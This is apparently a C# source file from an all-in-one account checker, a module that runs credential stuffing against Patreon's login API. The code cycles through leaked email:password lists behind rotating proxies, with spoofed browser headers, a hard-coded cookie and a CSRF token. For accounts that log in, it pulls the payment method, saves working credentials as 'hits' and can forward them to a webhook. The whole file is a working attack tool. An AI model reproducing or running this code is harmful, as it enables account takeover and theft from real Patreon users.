using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class patreonmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("cookie",
                                "patreon_locale_code=en-US; patreon_location_country_code=US; __cfduid=d4a78ee5214179435b57491f8fbb4b2211600999720; patreon_device_id=73c88a40-faa8-44d6-964b-78de1aae8962; __cf_bm=4ddce7d1c141a2853984692ea2f33aa65da351b6-1600999720-1800-AcP/65P8WHWVAZaBQ80wx/R0B09Z4yqZhNtQF9yFCRGm/yePclYrpR3By2+loXxQdOKbgS1eyV5YWfNF7I1EAfQ=; CREATOR_DEMO_COOKIE=1; G_ENABLED_IDPS=google");
                            var str = "{\"data\":{\"type\":\"user\",\"attributes\":{\"email\":\"" + array[0] +
                                      "\",\"password\":\"" + array[1] + "\"},\"relationships\":{}}}";
                            req.AddHeader("x-csrf-signature", "Sg3rMb1o922PEstPb4LXzHqPygE3MIdMhX762CZ3S2g");
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse =
                                req.Post(
                                    "https://www.patreon.com/api/login?include=campaign%2Cuser_location&json-api-version=1.0",
                                    str, "application/json").ToString();
                            {
                                if (strResponse.Contains("Incorrect email or password"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("Device Verification"))
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Patreon_frees", array[0] + ":" + array[1]);
                                }
                                else if (strResponse.Contains("attributes"))
                                {
                                    var cap = req.Get("https://www.patreon.com/pledges?ty=p").ToString();
                                    var payment = Parse(cap, "payout_method\": \"", "\"");
                                    if (cap.Contains("UNDEFINED"))
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Patreon", array[0] + ":" + array[1]);
                                        Export.AsResult("/Patreon_frees",
                                            array[0] + ":" + array[1] + " | Payment Method: " + payment);
                                    }
                                    else
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Patreon_hits",
                                            array[0] + ":" + array[1] + " | Payment Method: " + payment);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Patreon",
                                                array[0] + ":" + array[1] + " | Payment Method: " + payment);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(
                                                array[0] + ":" + array[1] + " | Payment Method: " + payment,
                                                "Patreon Hits");
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}